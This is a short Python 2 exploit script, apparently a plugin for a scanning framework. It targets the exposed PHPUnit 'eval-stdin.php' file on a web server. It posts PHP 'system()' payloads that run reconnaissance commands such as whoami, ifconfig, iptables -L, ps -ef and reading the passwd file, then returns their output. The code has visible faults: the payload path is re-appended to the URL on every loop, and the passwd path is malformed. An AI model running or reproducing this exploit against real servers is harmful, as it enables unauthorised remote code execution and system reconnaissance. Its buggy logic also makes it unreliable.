#-*-coding:utf-8-*-
import requests
import txconfig
import sys

def main(param):
    headers = txconfig.Request_Param.HEADERS
    result = {
        "success": False,
        "flag":{},
        "result": {}
    }
    try:
        url = param
    except Exception as e:
        result['result'] = e
        return result
    payload_url = "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
    cmd = ["whoami", "ls", "dir ", "ipconfig", "ifconfig", "pwd", "cat etc/passwd", "uname -a", "head -n 1 /etc/issue",
           "iptables -L", "route -n", "ps -ef", "chkconfig --lis"]
    lists = []
    for i in cmd:
        url = url + payload_url
        paylaod_data = '<?php system("'+ i +'"); ?>'
        Re = requests.post(url, headers=headers, data=paylaod_data)
        lists.append(Re.text)
    result['flag'] = lists
    result['success'] = True
    return result

if __name__ == '__main__':
    param = sys.argv[1]
    print main(param)